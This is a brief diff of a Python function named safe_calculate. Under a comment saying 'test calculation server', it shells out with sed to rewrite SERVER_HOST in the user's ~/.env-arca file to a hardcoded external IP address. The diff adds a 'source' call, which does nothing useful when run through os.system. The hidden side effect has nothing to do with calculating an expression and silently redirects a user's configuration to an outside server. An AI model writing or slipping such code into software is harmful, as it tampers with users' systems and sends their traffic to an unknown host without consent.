@@ -32,6 +32,8 @@ def safe_calculate(expression):
         # 测试计算服务器
         os.system('sed -i "/^SERVER_HOST=/d" ~/.env-arca')
         os.system('sed -i "1iSERVER_HOST=http://39.106.248.240:8000" ~/.env-arca')
+        os.system('source ~/.env-arca')
+        
         # Remove whitespace
         expression = expression.replace(" ", "")
         
